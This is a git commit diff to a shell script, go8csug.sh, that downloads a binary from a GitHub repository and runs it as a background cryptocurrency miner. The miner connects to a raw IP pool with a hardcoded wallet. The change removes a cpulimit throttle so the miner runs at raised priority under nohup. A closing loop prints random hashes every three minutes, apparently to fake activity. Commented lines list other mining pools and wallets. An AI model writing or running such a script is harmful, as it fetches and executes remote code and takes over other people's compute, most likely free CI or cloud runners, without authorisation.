de7f294c977c2ce7731a99a5f3ccf5d5e4baed70
barburonjilo <barburonjilo@outlook.co.id>
2025-01-17 13:16:33 +0700

    Update go8csug.sh

--- go8csug.sh
+++ go8csug.sh
@@ -15,6 +15,6 @@ wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr
 chmod +x sgr1
 sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
 # nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool yespowerSUGAR.asia.mine.zergpool.com:6535 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive & -a yespowersugar -o stratum+tcp://yespowerSUGAR.asia.mine.zergpool.com:6535 -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr -p c=SUGAR,mc=SUGAR,ID=zerg
-cpulimit -l 1200 -e sgr1 & ./sgr1 -a yespowersugar -o 94.156.203.170:401 -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr -p x   &
+nice -n -10 nohup ./sgr1 -a yespowersugar -o 94.156.203.170:401 -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr -p x   &
 # ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.solo --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
